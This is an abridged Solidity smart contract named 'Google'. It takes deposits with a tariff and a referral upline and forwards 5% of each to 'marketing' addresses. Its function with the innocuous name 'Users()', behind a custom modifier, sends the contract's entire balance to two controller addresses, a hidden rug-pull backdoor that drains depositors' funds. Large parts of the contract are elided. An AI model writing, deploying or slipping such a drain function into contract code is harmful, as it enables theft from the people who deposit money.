...
contract Google {
    ...
    function c(uint[] memory) external {
                                }
    function d(uint[] calldata) external {
                                }
    function e(uint[] memory) public {
                                }
    ...
    constructor (address payable marketingAddr,address payable marketingAddr1,address payable marketingAddr2) {
                           
    marketing = marketingAddr;
    marketing1 = marketingAddr1;
    marketing2 = marketingAddr2;
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        ...
        //marketing fee
        payable(marketing1).transfer(msg.value * 5 / 100);
        payable(marketing2).transfer(msg.value * 5 / 100);
    ...
    function Users() external projectcontract {
                                 
     marketing1.transfer((address(this).balance) * 1 / 2);
     marketing2.transfer((address(this).balance));
                            }
